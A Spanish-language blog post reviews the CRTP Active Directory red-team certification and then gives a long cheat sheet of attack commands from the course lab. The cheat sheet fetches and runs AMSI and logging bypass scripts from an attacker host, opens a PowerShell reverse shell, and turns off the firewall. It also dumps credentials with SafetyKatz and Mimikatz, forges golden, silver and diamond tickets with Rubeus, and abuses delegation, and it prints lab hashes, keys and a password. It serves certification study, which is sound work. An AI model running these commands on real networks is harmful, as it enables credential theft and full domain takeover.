---
title: "Certified Red Team Professional (CRTP) 2025 Review"
date: 2025-11-13 02:35:00 +0000
categories: [Certifications]
tags: [CRTP, AlteredSecurity, ActiveDirectory]
image: /assets/img/certifications/crtp/crtp.png
---
## Introduction

El **Certified Red Team Professional (CRTP)** de _Altered Security_ es una certificación práctica de nivel principiante-intermedio que se centra en la explotación de entornos Active Directory utilizando exclusivamente herramientas de Windows. A diferencia de otras certificaciones que dependen de entornos Linux, el CRTP te enseña a atacar desde dentro, usando binarios de Windows, PowerShell y las propias herramientas del sistema.

Para mí, esta fue mi segunda certificación oficial después del **Certified Red Team Analyst (CRTA)** de _CyberWarfare Labs_, y marcó un punto de inflexión en mi approach hacia la seguridad ofensiva. Siempre había dependido de distribuciones Linux para atacar Active Directory, pero el CRTP me abrió los ojos a todo un mundo de posibilidades desde dentro del propio entorno Windows. Es cierto, que en cuanto a conceptos y ataques de Active Directory ya tenía una base bastante sólida y me defendía bastante bien.

El CRTP es un examen 100% práctico: tienes 24 horas para comprometer un entorno Active Directory completamente parcheado con múltiples dominios y bosques, utilizando Servidores Windows 2022. La filosofía es clara: no depende de exploits parcheables, sino del abuso de características y funcionalidades legítimas de Active Directory. Por otro lado, deberás realizar un informe al estilo **walkthrough** del path completo de cómo has llegado a comprometer todo el bosque de Active Directory.

Un certificado CRTP demuestra que comprendes y puedes evaluar la seguridad de un entorno Active Directory, con habilidades como:

- **Enumeración de Active Directory**
- **Escalada de privilegios local y de dominio** mediante Kerberoast, delegación Kerberos, abuso de grupos protegidos y aplicaciones empresariales
- **Persistencia y dominio del entorno** usando Golden/Silver tickets, Skeleton key, abuso de DSRM, AdminSDHolder, DCSync y ACLs
- **Escalada entre bosques** mediante ataques cross-trust
- **Ataques sobre relaciones de confianza** entre forests

Esta certificación no solo te da técnicas, sino que te cambia la mentalidad sobre cómo se puede comprometer un entorno desde dentro, usando lo que ya está disponible.

---
## The Course

La verdad es que el curso me ha gustado mucho más de lo que esperaba. He aprendido un montón sobre cómo atacar un entorno de **Active Directory** directamente desde **Windows**. El material, tanto los PDFs como los vídeos, es excelente.

Personalmente, no soy mucho de ver vídeos. Me distraigo fácilmente y me cuesta concentrarme, así que opté por leer directamente los PDFs, crearme un buen **cheatsheet** (que compartiré más adelante) y luego lanzarme de lleno al Lab para practicar de cara al examen.

Del material en PDF no me puedo quejar para nada. Tiene información muy útil, comandos que necesitarás sí o sí, cada uno con su explicación correspondiente. Sobre los vídeos, sinceramente no puedo opinar con criterio porque no los vi todos. Solo miré algunos cuando necesitaba aclarar algo que no me quedaba claro, y los que vi sí me ayudaron.

En cuanto al **Lab**... ¡wow! Me quedo sin palabras. Es impresionante. Incluye muchas situaciones que luego no aparecen en el examen, pero me dejó totalmente alucinado. Es un laboratorio perfecto, con distintas vulnerabilidades, y te explican cómo realizar cada objetivo de diferentes maneras. Los **Learning Objectives** son las actividades que hay que completar; en total hay **40 flags** que debes conseguir para el certificado de finalización del Lab (**OJO**: no el del examen, sino el de práctica).

Lo único malo que le podría poner es que es **compartido**, pero la verdad es que, aparte de algún problemilla puntual, ni lo he notado. Ha ido bastante estable, me lo he pasado genial y, lo más importante, he podido poner en práctica todo lo aprendido.

----
## The Exam


Aquí viene una pequeña decepción para mí: el examen. ¿Por qué? Básicamente porque se nota mucho la diferencia de nivel entre el laboratorio práctico y el examen final.

Aprobé mi examen del CRTP en menos de **1 hora y 40 minutos** en mi primer intento, sin contar los **20-30 minutos** de espera inicial para que se iniciara el lab. Hay que decir que ese día me había tomado **5 energéticas** y iba con toda la dopamina... Inicié el examen, todo salía según lo planeado, cada pieza del puzzle encajaba perfectamente hasta que obtuve el control completo del bosque.

El examen (sin spoilers) consta de **5 máquinas** en un único bosque de dominio. No hay múltiples bosques ni ataques complejos de Trusts, algo que me sorprendió después de la profundidad del laboratorio. Según me comentaron, en el CRTE pasa algo similar, donde esperarías más bosques pero solo hay 2 o 3.

El objetivo es obtener el control de las **5 máquinas** para convertirte en **Enterprise Admin** del root forest.

Mientras avanzaba, fui tomando capturas de pantalla para luego elaborar el informe final. Tienes **24 horas** para completar el examen y **48 horas adicionales** para enviar el informe técnico/walkthrough detallando todo el proceso. En mi caso, me gusta redactar mucho, así que preparé un informe profesional (dentro de lo que se pide) para ir super seguro a la hora de entregar el informe.

Mi informe técnico final, se veía de la siguiente manera:

![images](/assets/img/certifications/crtp/crtp_2.png)

Una vez enviado el informe, en menos de **una semana y media** me notificaron por correo que había aprobado la certificación CRTP.

![images](/assets/img/certifications/crtp/celebrate-homer-simpson.gif)

---
## Conclusion

El **CRTP** ha sido una certificación que, sinceramente, me ha sorprendido para bien. Si bien es cierto que el examen me pareció más asequible de lo esperado después de la profundidad del laboratorio, el valor real está en el **proceso de aprendizaje**.

Esta certificación me enseñó algo que ningún otro curso me había mostrado: cómo **moverse como un atacante real dentro de un entorno Windows**. Dejé de depender tanto de mis herramientas de Linux y aprendí a explotar una vez dentro del dominio.

Para alguien que quiere empezar en el mundo de **Active Directory**, el CRTP es sin duda el camino a seguir. Te da una base sólida, te enseña las técnicas fundamentales y, lo más importante, te prepara para certificaciones más avanzadas como el **CRTE**.

¿Lo recomendaría? Absolutamente. Especialmente si vienes del mundo Linux y quieres entender cómo se ve un ataque desde dentro del entorno Windows. Eso sí, no subestimes el laboratorio - ahí es donde realmente se aprende, aunque el examen pueda parecerte más sencillo.

![images](/assets/img/certifications/crtp/crtp_jeremy.png)

----
## Cheat sheet Tools

### Interesting Commands

**Comando más importante:** Ejecutar comandos en un nuevo sistema objetivo que tengamos permisos de acceso remoto o que seamos Local Admin. recomiendo todo el CRTP hacerlo con `winrs`.

```powershell
winrs -r:dcorp-dc.dollarcorp.moneycorp.local "powershell -e <BASE64>"
```

Bypass Script-Block Logging y AMSI, siempre ejecutar al obtener una nueva shell.
```powershell
IEX(IWR http://172.16.100.56/sbloggingbypass.txt -UseBasicParsing); IEX(IWR http://172.16.100.56/amsibypass.txt -UseBasicParsing)
```

Reverse de `Invoke-PowerShellTcp.ps1` sin modificar
```powershell
IEX (IWR http://172.16.100.56/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.56 -Port 443
```

Copiar archivo a un recurso compartido u otra ubicación
```shell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc.dollarcorp.moneycorp.local\c$\Users\Public /y
```

Crear un portproxy para lanzar ``SafetyKatz`` remotamente desde el puerto 8080 de la víctima al 80 donde servimos `SafetyKatz`
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.56
```

Desactivar todo el Firewall en el equipo
```powershell
netsh advfirewall set allprofiles state off
```
----
### SafetyKatz

##### OverPass-the-Hash

Realizar `Pass-the-Hash (PtH)` a través de `SafetyKatz` desde nuestra máquina atacante. (Requiere ejecutar la terminal como Administrador)
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-pth /user:administrator /domain:dollarcorp.moneycorp.local /rc4:<ntlmhash> /run:powershell.exe" "exit"

C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe" "exit"
```
----

##### DCSync

Realizar `DCSync` desde `SafetyKatz` de diferentes maneras, dependiendo el contexto
```powershell
# Desde mi máquina atacante si disponemos de TGT válido o similar
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local" "exit"

# DCSync desde la máquina víctima con los binarios transferidos
C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local" "exit"

# DCSync a través de portproxy en la víctima hacía mi servidor HFS
C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local" "exit"
```
----

##### Dump Kerberos Tickets and PTT (Pass-The-Ticket)

Exportar los tickets de Kerberos.
```powershell
# Desde mi máquina atacante 
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::tickets /export" "exit"

# Desde la máquina víctima con los binarios transferidos
C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::tickets /export" "exit"

# Desde la máquina víctima a través de portproxy hacia mi servidor HFS
C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::tickets /export" "exit"
```

Pass-The-Ticket (PTT)
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "kerberos::evasive-ptt C:\Users\Public\ticket.kirbi"
```
----

##### LSADump (SAM, LSA and Trust)

- SAM

```powershell
# Desde mi máquina atacante
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"

# Desde la máquina víctima con los binarios transferidos
C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"

# Desde la máquina víctima a través de portproxy hacia mi servidor HFS
C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
```

- LSA

Podemos poner `/inject` o `/patch`, siendo el primero más sigiloso.

```powershell
# Desde mi máquina atacante
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-lsa /inject" "exit"

# Desde la máquina víctima con los binarios transferidos
C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-lsa /inject" "exit"

# Desde la máquina víctima a través de portproxy hacia mi servidor HFS
C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /inject" "exit"
```

- Trust

```powershell
# Desde mi máquina atacante
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-trust /inject" "exit"

# Desde la máquina víctima con los binarios transferidos
C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "lsadump::evasive-trust /inject" "exit"

# Desde la máquina víctima a través de portproxy hacia mi servidor HFS
C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /inject" "exit"
```
----

##### Credential Extraction (keys and vault)

Extraer credenciales de Kerberos mediante `SafetyKatz` y el módulo `sekurlsa::evasive-keys`:
```powershell
# Extraer de mi máquina atacante
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"

# Extraer en la víctima pasando los binarios
C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"

# Extraer en la víctima a través de portproxy hacía mi HFS
C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

Extraer credenciales almacenadas en el `vault`:
```powershell
# Extraer de mi máquina atacante
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"

# Extraer en la víctima pasando los binarios
C:\Users\Public\Loader.exe -Path C:\Users\Public\SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"

# Extraer en la víctima a través de portproxy hacía mi HFS
C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "vault::cred /patch" "exit"
```

---
### Invoke-Mimikatz
#### OverPass-the-Hash

Realizar `Pass-the-Hash (PtH)` a través de `Invoke-Mimikatz` desde nuestra máquina atacante. (Requiere ejecutar la terminal como Administrador)
```powershell
Invoke-Mimi -Command '"sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /rc4:<ntlmhash> /run:powershell.exe"'

Invoke-Mimi -Command '"sekurlsa::pth /user:administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /run:powershell.exe"'
```
---
#### DCSync

```powershell
Invoke-Mimi -Command '"lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local"'
```
---
#### Dump Kerberos Tickets and PTT (Pass-The-Ticket)

```powershell
Invoke-Mimi -Command '"sekurlsa::tickets /export"'
```

```powershell
Invoke-Mimi -Command '"kerberos::ptt C:\Users\Public\ticket.kirbi"'
```
---
#### LSADump (SAM, LSA and Trust)

- SAM

```powershell
Invoke-Mimi -Command '"token::elevate" "lsadump::sam'
```

- LSA

```powershell
Invoke-Mimi -Command '"lsadump::lsa /inject"'

Invoke-Mimi -Command '"lsadump::lsa /patch"'
```

- Trust

```powershell
Invoke-Mimi -Command '"lsadump::trust /patch"'

Invoke-Mimi -Command '"lsadump::trust /inject"'
```
---
#### Credential Extraction (keys and vault)

- `sekurlsa::ekeys`

```powershell
Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

- `vault::cred`

```powershell
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```

---

### Rubeus

#### OverPass-the-Hash

Inyectar un TGT en la sesión actual utilizando Rubeus (no hace falta ejecutar como administrador)
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /domain:dollarcorp.moneycorp.local /rc4:<ntlmhash> /ptt

C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /ptt
```

Generar un TGT  y lanzar proceso autenticado utilizando Rubeus (requiere ejecutar como administrador)
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /domain:dollarcorp.moneycorp.local /rc4:<ntlmhash> /opsec /createnetonly:"C:\Windows\System32\cmd.exe" /show /ptt

C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /domain:dollarcorp.moneycorp.local /aes256:<aes256key> /opsec /createnetonly:"C:\Windows\System32\cmd.exe" /show /ptt
```

----
####  ASREP Roast

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asreproast /user:gzzcoo /outfile:asrephashes.txt
```
----
#### Kerberoasting

A una cuenta en específica
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec
```

A todas las cuentas posibles
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /rc4opsec /outfile:hashes.txxt
```
----
#### Pass-the-Ticket (PTT)

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args ptt /ticket:<base64ticket>
```
----
#### Service for User (S4U)

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:<aes256key> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-websrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local /altservice:ldap /ptt
```

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std456$ /aes256:0b2e54731f1f52b3df40fcb16cd986a603c8f5f66ad3fa78bc30a599065fd28d /msdsspn:http/dcorp-mgmt /impersonateuser:Administrator /ptt
```
----
#### Golden Ticket

Generar un Golden Ticket a través de Rubeus
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:<aes256key> /sid:<domain_sid> /user:Administrator /ldap /printcmd
```

Usar versión extendida con más atributos simulando un TGT real. Requiere haberlos recolectado antes del anterior comando.
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:931 /netbios:dcorp /groups:544,512,520,513 /dc:dcorp-dc.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```
----
#### Silver Ticket

- **HTTP** --> para poder conectarse vía WinRM

Con las claves del equipo `dcorp-dc$` podemos generar un **Silver Ticket** para el servicio `HTTP/dcorp-dc.dollarcorp.moneycorp.local`. Este ticket es aceptado por **WinRM**, lo que nos permite abrir una sesión remota en el DC y ejecutar comandos como si fuéramos `Administrator`.

Podemos forjar el ticket tanto con el **hash NTLM (RC4-HMAC)** como con la clave **AES256**.

**RC4**
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -Args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:bdbc454801450619022410ca90d266c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /user:Administrator /domain:dollarcorp.moneycorp.local /ldap /ptt
```

**AES256**
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -Args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:bdbc454801450619022410ca90d266c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /user:Administrator /domain:dollarcorp.moneycorp.local /ldap /ptt
```

- **WMI** --> poder ejecutar vía WMI

Para conseguir ejecución remota vía **WMI**, necesitamos falsificar tickets de servicio (`TGS`) para:

- **HOST** → acceso al servicio de sistema en el DC.
- **RPCSS** → acceso al servicio de **Remote Procedure Call**, necesario para que WMI funcione.

Con ambos tickets inyectados, podremos ejecutar consultas y comandos en el DC como si fuéramos un usuario legítimo.

**RC4**

1. Crear ticket para el servicio HOST

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -Args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /aes256:28cfd1ea9a9ff37b7782e3c4ccf73f00f5a99862ffad1a9a97d49ae26a99d872 /sid:S-1-5-21-719815819-3726368948-3917688648 /user:Administrator /domain:dollarcorp.moneycorp.local /ldap /ptt
```

2. Crear ticket para el servicio RPCSS

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -Args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /aes256:28cfd1ea9a9ff37b7782e3c4ccf73f00f5a99862ffad1a9a97d49ae26a99d872 /sid:S-1-5-21-719815819-3726368948-3917688648 /user:Administrator /domain:dollarcorp.moneycorp.local /ldap /ptt
```

**AES256**

1. Crear ticket para el servicio HOST

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -Args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /aes256:28cfd1ea9a9ff37b7782e3c4ccf73f00f5a99862ffad1a9a97d49ae26a99d872 /sid:S-1-5-21-719815819-3726368948-3917688648 /user:Administrator /domain:dollarcorp.moneycorp.local /ldap /ptt
```

2. Crear ticket para el servicio RPCSS

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -Args evasive-silver /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /aes256:28cfd1ea9a9ff37b7782e3c4ccf73f00f5a99862ffad1a9a97d49ae26a99d872 /sid:S-1-5-21-719815819-3726368948-3917688648 /user:Administrator /domain:dollarcorp.moneycorp.local /ldap /ptt
```

----
#### Diamond Ticket

**- User + Password**

Usando el usuario `student456` con su contraseña en claro:
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:student456 /password:8CTkSmZE4aC2yFas /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:"C:\Windows\System32\cmd.exe" /show /ptt
```

- **User + RC4 (NTLM)**

Si no tenemos la contraseña en claro, podemos usar el hash NTLM del usuario:
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:student456 /rc4:35286e888c8f0b2f2e11023f17f1559b /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:"C:\Windows\System32\cmd.exe" /show /ptt
```

- **User + AES256**

También podemos utilizar la clave AES256 del propio `student456`:
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:student456 /aes256:<aes256key> /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:"C:\Windows\System32\cmd.exe" /show /ptt
```

- **Using /tgtdeleg**

Si ya disponemos de un TGT válido en memoria, no necesitamos credenciales. Podemos usar `/tgtdeleg` y Rubeus se encargará de capturar el TGT real y re-firmarlo con la clave de `krbtgt`. Para verificar, listamos los tickets en memoria con `klist` y deberíamos ver un TGT válido de `Administrator` con los grupos de Domain Admins, que podremos usar para autenticarnos en servicios del dominio.
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:"C:\Windows\System32\cmd.exe" /show /ptt
```

----
#### Monitor

```powershell
# Desde mi máquina atacante
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap

# Desde la máquina víctima
C:\User\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```
----
### Attacking Kerberos

#### Unconstrained Delegation and Bug Printer

Si salen dos máquinas aquí es posible, pero tenemos que disponer del control de una de ellas.

```powershell
# PowerView
Get-DomainComputer -Unconstrained | Select samAccountName,DNSHostName,OperatingSystem

# ActiveDirectory Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | Select samAccountName,DNSHostName
```

---
#### Constrained Delegation - User Trust

Enumerar usuarios con `Constrained Delegation`
```powershell
# PowerView
Get-DomainUser -TrustedToAuth -Domain dollarcorp.moneycorp.local
Get-DomainUser -TrustedToAuth -Domain dollarcorp.moneycorp.local | Select samAccountName,msds-allowedtodelegateto

# ActiveDirectory Module
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo
Get-ADUser -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties * | Select samAccountName,msDS-AllowedToDelegateTo
```

En caso de disponer del `RC4` o `AES256` del usuario objetivo, podemos realizar S4U.

```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
```

---
#### Constrained Delegation - Computer Trust
.
Si obtenemos algún resultado, verificar cautelosamente. Tenemos que tener el control sobre alguna de ellas, para así obtener su `aes256` o su `rc4`.

```powershell
# PowerView
Get-DomainComputer -TrustedToAuth -Domain dollarcorp.moneycorp.local
Get-DomainComputer -TrustedToAuth -Domain dollarcorp.moneycorp.local | Select samAccountName,dnshostname,msds-allowedtodelegate

# ActiveDirectory Module
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"} -Properties msDS-AllowedToDelegateTo | Select samAccountName,msDS-AllowedToDelegateTo
Get-ADComputer -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties msDS-AllowedToDelegateTo | Select samAccountName,msDS-AllowedToDelegateTo
```

Ejemplo:

1. En caso de que obtengamos que el equipo `dcorp-websrv` tiene `Constrained Delegation` y tenemos Local Admin sobre él, lo primero será obtener sus keys

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-websrv\c$\Users\Public /y

winrs -r:dcorp-websrv cmd

netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.56

C:\Users\Public\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-keys" "exit"
```

2. Una vez obtenida su `aes256` del equipo, podemos realizar un **S4U** y pedir un `/altservice` como `LDAP`,  `HTTP` o `CIFS` en caso de que tenga un SPN inofensivo.

Para más información --> [[6.16 - Learning Objective 16#Constrained Delegation (Computer)|Constrained Delegation (Computer)]]
 
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-srv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.local /altservice:ldap /ptt
```

---
#### Resource-based Constrained Delegation

Revisar si uno de los usuarios que tenemos `Pwn3d` tiene `GenericWrite` sobre un equipo, podemos realizarlo desde `PowerView` o ``BloodHound``.
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Import-Module C:\AD\Tools\PowerView.ps1
Find-InterestingDomainACL -ResolveGUIDs | ?{$_.identityreferencename -match 'ciadmin'}
```

Si disponemos de alguno, realizamos el `RBCD`.
```powershell
Set-DomainRBCD -Identity dcorp-ws01 -DelegateFrom 'dcorp-std456$'
Get-DomainRBCD
```

Obtenemos las keys (RC4, AES256) de nuestra máquina atacante
```powershell
# SafetyKatz
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"

# Invoke-Mimikatz
Invoke-Mimi -Command '"sekurlsa::ekeys"'
```

Realizamos S4U obteniendo finalmente Admin Privs en el equipo objetivo
```powershell
# A través del RC4
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std456$ /rc4:<RC4_KEY> /msdsspn:http/dcorp-ws01 /impersonateuser:administrator /ptt

# A través de AES256
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std456$ /aes256:<AES256_KEY> /msdsspn:http/dcorp-ws01 /impersonateuser:administrator /ptt
```
